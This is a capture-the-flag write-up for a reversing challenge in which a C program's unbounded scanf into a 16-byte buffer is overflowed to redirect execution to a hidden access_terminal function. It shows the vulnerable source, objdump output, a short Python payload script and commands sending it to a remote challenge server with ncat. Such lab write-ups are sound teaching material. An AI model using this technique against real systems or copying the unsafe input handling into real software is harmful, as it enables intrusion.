# Access Terminal

## Description
```
I found this self written authentication service that protects my friend' server terminal.

He told me he wrote it in C and copied most of the code from ChatGPT but ensured me that it is absolutely bullet-proof, or is it?
```

## Writeup

This is a simple reversing challenge with the goal of overwriting a return address of a C program.
If we inspect the source code we can observe that the program itself does not call our interesting `access_terminal` function.

```c
int main()
{
  start();
  puts("Not so easy!");
  fflush(stdout);
  return 0;
}
```

But we can see that it utilizes an unsafe way of reading the user input using `scanf()`, so we have to find out how we can precisely
overflow this input in a way that it overwrites the `RIP` register and point it to `access_terminal`.

```c
void start()
{
  char input [16];
  printf("%p\n",start);
  fflush(stdout);
  puts("Tell me the access word:");
  fflush(stdout);
  scanf("%s",input);
  return;
}
```

By trying out some iterations of `A`'s, we find out that a `Segmentation Fault` occurs at 24 times `A`.

So the only thing left to do is to use a tool like `objdump` to find out the address of `access_terminal`.

```bash
objdump -d server
# output omitted ...
0000000000401166 <accessTerminal>:
  401166:       55                      push   %rbp
  401167:       48 89 e5                mov    %rsp,%rbp
# output omitted ...
```

We have to iterate the base address by one to correctly start at the functions first instruction which gives us `0x401167`.
By now we have our full payload string and can incorporate it into a simple python script that assembles everything for us.

```py
import sys

return_address = b"\x40\x11\x67"[::-1]
payload=b"A"*24 + return_address

sys.stdout.buffer.write(payload)
```

Notice that the hex string is reversed because we run this on an AMD/Intel x86 System, which works with little_endian notation.

We can test this locally by piping it directly into the binary

```bash
python exploit.py | ./server
```

To do this remotely we f.E. use it in conjunction with `ncat`

```bash
python exploit.py | ncat 1.2.3.4 1337
```

This should get us access and print the flag.
